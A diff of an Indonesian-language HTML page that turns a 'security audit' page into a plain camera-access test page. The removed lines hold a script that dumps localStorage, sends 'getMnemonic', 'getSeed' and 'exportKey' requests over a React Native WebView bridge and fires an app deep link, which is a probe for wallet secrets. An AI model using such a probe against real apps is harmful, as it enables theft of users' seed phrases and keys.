@@ -1,63 +1,35 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>Advanced Security Audit</title>
+    <title>Akses Kamera Standar</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .leak-box { border: 1px dashed #00ff00; padding: 15px; margin-top: 20px; background: #001100; }
-        .btn-exploit { background: #ff0000; color: white; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
-        .log-line { font-size: 11px; border-bottom: 1px solid #111; padding: 2px; }
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; }
+        video { width: 90%; max-width: 500px; border-radius: 10px; border: 2px solid #ff00ff; }
     </style>
 </head>
 <body>
 
-    <h2>[ Audit Mode: Activated ]</h2>
-    
-    <button class="btn-exploit" onclick="runAudit()">JALANKAN SCAN LOGIKA SENSITIF</button>
-
-    <div class="leak-box">
-        <strong>Data Terdeteksi:</strong>
-        <div id="logs">Menunggu pemicu...</div>
-    </div>
+    <h2>Status Kamera: <span id="status">Menunggu Izin...</span></h2>
+    <video id="video" autoplay playsinline></video>
 
     <script>
-        const logs = document.getElementById('logs');
-        function addLog(msg) {
-            const div = document.createElement('div');
-            div.className = 'log-line';
-            div.innerText = [${new Date().toLocaleTimeString()}] ${msg};
-            logs.insertBefore(div, logs.firstChild);
-        }
-
-        async function runAudit() {
-            addLog("Memulai ekstraksi LocalStorage...");
-            
-            // 1. Mencoba membaca semua kunci di penyimpanan lokal
+        async function startCamera() {
             try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    addLog(DITEMUKAN: ${key} = ${val.substring(0, 20)}...);
-                }
-            } catch (e) { addLog("Storage Access Denied."); }
-
-            // 2. Mencoba bypass Bridge via Bruteforce (Zero-day style)
-            if (window.webkit?.messageHandlers?.ReactNativeWebView) {
-                const commands = ["getAccount", "getMnemonic", "getSeed", "exportKey"];
-                commands.forEach(cmd => {
-                    window.webkit.messageHandlers.ReactNativeWebView.postMessage({ type: cmd });
-                    addLog(Fuzzing Bridge: ${cmd});
-                });
+                // Meminta izin kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.getElementById('video');
+                videoElement.srcObject = stream;
+                document.getElementById('status').innerText = "Aktif";
+                
+                // Izin biasanya akan tersimpan otomatis oleh browser untuk domain HTTPS ini
+            } catch (err) {
+                console.error("Gagal akses kamera: ", err);
+                document.getElementById('status').innerText = "Ditolak/Error";
             }
-
-            // 3. Mencoba memicu Deep Link dari dalam WebView
-            // Jika aplikasi tidak memblokir navigasi ke skemanya sendiri
-            addLog("Mencoba navigasi internal...");
-            window.location.href = "frw://settings"; 
         }
 
-        // Otomatis deteksi User Agent untuk mencari kebocoran info
-        addLog("User-Agent: " + navigator.userAgent);
+        // Jalankan saat halaman dimuat
+        window.onload = startCamera;
     </script>
 </body>
 </html>
